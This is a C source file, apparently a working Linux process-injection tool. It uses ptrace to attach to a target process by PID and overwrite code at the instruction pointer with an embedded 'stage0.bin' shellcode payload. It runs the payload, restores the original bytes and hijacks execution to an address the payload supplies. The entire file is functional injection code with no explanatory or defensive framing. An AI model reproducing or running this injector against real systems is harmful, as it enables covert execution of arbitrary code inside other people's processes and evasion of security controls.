#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/ptrace.h>
#include <sys/types.h>

#define PTRACE_CALL(request, pid, addr, data) \
   do { \
      if (ptrace(request, pid, addr, data) == -1) { \
         perror("ptrace: " #request); \
         return 1; \
      } \
   } while (0)

static unsigned char payload[] = {
#embed "stage0.bin"
};
static long payload_len = sizeof(payload);

static unsigned char *orig_data = NULL;
static long orig_data_len = 0;

static int _strtoi(char *s, int *o) {
   char *e;
   errno = 0;
   
   long t = strtol(s, &e, 10);
   if (errno == ERANGE || e == s || *e != '\0') {
      return 0;
   }
   *o = (int)t;
   return 1;
}

static int _read_process_memory(pid_t pid, void *addr, unsigned char *buf, size_t len) {
   for (size_t i = 0; i < len; i += sizeof(long)) {
      long word = ptrace(PTRACE_PEEKDATA, pid, addr + i, NULL);
      if (word == -1 && errno != 0) {
         perror("ptrace peekdata");
         return 0;
      }
      size_t remain = len - i;
      size_t s_copy = remain < sizeof(long) ? remain : sizeof(long);
      memcpy(buf + i, &word, s_copy);
   }
   return 1;
}

static int _write_process_memory(pid_t pid, void *addr, const unsigned char *buf, size_t len) {
   for (size_t i = 0; i < len; i += sizeof(long)) {
      long word = 0;
      size_t remain = len - i;
      size_t s_copy = remain < sizeof(long) ? remain : sizeof(long);
      memcpy(&word, buf + i, s_copy);
      if (ptrace(PTRACE_POKEDATA, pid, addr + i, word) == -1) {
         perror("ptrace pokedata");
         return 0;
      }
   }
   return 1;
}

int main(int argc, char *argv[]) {
   if (argc != 2) {
      printf("usage: %s [pid]\n", argv[0]);
      return 1;
   }

   pid_t pid;
   if (!_strtoi(argv[1], &pid)) {
      printf("error: invalid pid\n");
      return 1;
   }

   if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
      perror("ptrace");
      return 1;
   }

   waitpid(pid, NULL, 0);
   struct user_regs_struct regs = {0};
   if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
      perror("ptrace");
      return 1;
   }

   void *target_addr = (void*)regs.rip;

   orig_data = malloc(payload_len);
   if (!orig_data) {
      perror("malloc");
      return 1;
   }
   orig_data_len = payload_len;

   if (!_read_process_memory(pid, target_addr, orig_data, payload_len)) {
      free(orig_data);
      return 1;
   }

   if (!_write_process_memory(pid, target_addr, payload, payload_len)) {
      free(orig_data);
      return 1;
   }

   regs.rip = (unsigned long)target_addr;
   PTRACE_CALL(PTRACE_SETREGS, pid, NULL, &regs);
   PTRACE_CALL(PTRACE_CONT, pid, NULL, NULL);

   waitpid(pid, NULL, 0);

   struct user_regs_struct regs2 = {0};
   PTRACE_CALL(PTRACE_GETREGS, pid, NULL, &regs2);
   regs2.rip = regs2.r8;
   regs2.r14 = regs.rip;
   PTRACE_CALL(PTRACE_SETREGS, pid, NULL, &regs2);

   if (!_write_process_memory(pid, target_addr, orig_data, payload_len)) {
      free(orig_data);
      return 1;
   }

   PTRACE_CALL(PTRACE_SINGLESTEP, pid, NULL, NULL);
   waitpid(pid, NULL, 0);
   PTRACE_CALL(PTRACE_DETACH, pid, NULL, NULL);

   printf("done\n");
   return 0;
}
